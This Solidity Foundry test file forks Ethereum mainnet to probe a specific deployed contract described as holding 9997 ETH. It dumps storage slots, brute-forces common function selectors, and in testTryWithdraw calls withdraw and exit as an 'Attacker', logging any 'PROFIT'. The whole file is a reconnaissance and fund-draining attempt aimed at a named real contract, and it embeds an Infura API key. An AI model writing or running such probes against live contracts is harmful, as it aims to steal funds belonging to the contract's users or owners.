// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

contract DeepProbeTest is Test {
    address constant TARGET = 0xC82Abe4dFA94b9B5453d31274Fb7500459a0d12d;
    
    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    function testDeepProbe() public {
        console.log("=== DEEP PROBE 9997 ETH CONTRACT ===");
        console.log("Target:", TARGET);
        console.log("Balance:", TARGET.balance / 1e18, "ETH");
        
        // Check storage slots 0-20
        console.log("\n--- Storage Slots ---");
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(TARGET, bytes32(i));
            if (uint256(slot) != 0) {
                address addr = address(uint160(uint256(slot)));
                console.log("Slot", i);
                console.log("  Raw:", vm.toString(slot));
                if (addr.code.length > 0) {
                    console.log("  As addr (is contract):", addr);
                }
            }
        }

        // Try calling functions with selector bruteforce
        console.log("\n--- Testing Common Selectors ---");
        bytes4[15] memory sigs = [
            bytes4(0x3ccfd60b), // withdraw()
            bytes4(0x2e1a7d4d), // withdraw(uint256)
            bytes4(0xe9fad8ee), // exit()
            bytes4(0x4e71d92d), // claim()
            bytes4(0xdb006a75), // redeem(uint256)
            bytes4(0x853828b6), // withdrawAll()
            bytes4(0x7d7c2a1c), // claimRewards()
            bytes4(0xd294f093), // claimAll()
            bytes4(0x3d18b912), // getReward()
            bytes4(0x00f714ce), // withdraw(uint256,address)
            bytes4(0xf3fef3a3), // withdraw(address,uint256)
            bytes4(0xa9059cbb), // transfer(address,uint256)
            bytes4(0x23b872dd), // transferFrom(address,address,uint256)
            bytes4(0x70a08231), // balanceOf(address)
            bytes4(0x8da5cb5b)  // owner()
        ];
        
        for (uint i = 0; i < sigs.length; i++) {
            (bool success, bytes memory data) = TARGET.staticcall(abi.encodeWithSelector(sigs[i]));
            if (success && data.length > 0) {
                console.log("SUCCESS staticcall selector:", vm.toString(sigs[i]));
                console.log("  Return data length:", data.length);
            }
        }
        
        // Try owner() specifically
        (bool ownerSuccess, bytes memory ownerData) = TARGET.staticcall(abi.encodeWithSelector(0x8da5cb5b));
        if (ownerSuccess && ownerData.length >= 32) {
            address owner = abi.decode(ownerData, (address));
            console.log("\n--- Owner ---");
            console.log("Owner address:", owner);
        }

        // Try balanceOf(this)
        (bool balSuccess, bytes memory balData) = TARGET.staticcall(
            abi.encodeWithSelector(0x70a08231, address(this))
        );
        if (balSuccess && balData.length >= 32) {
            uint256 bal = abi.decode(balData, (uint256));
            console.log("balanceOf(this):", bal);
        }
    }

    function testTryWithdraw() public {
        uint256 balBefore = address(this).balance;
        console.log("Attacker balance before:", balBefore);
        
        // Try withdraw()
        (bool s1,) = TARGET.call(abi.encodeWithSelector(0x3ccfd60b));
        console.log("withdraw() result:", s1);
        
        // Try withdraw(uint256) with contract's balance
        (bool s2,) = TARGET.call(abi.encodeWithSelector(0x2e1a7d4d, TARGET.balance));
        console.log("withdraw(balance) result:", s2);
        
        // Try exit()
        (bool s3,) = TARGET.call(abi.encodeWithSelector(0xe9fad8ee));
        console.log("exit() result:", s3);
        
        uint256 balAfter = address(this).balance;
        console.log("Attacker balance after:", balAfter);
        
        if (balAfter > balBefore) {
            console.log("!!! PROFIT:", (balAfter - balBefore) / 1e18, "ETH !!!");
        }
    }

    receive() external payable {}
}
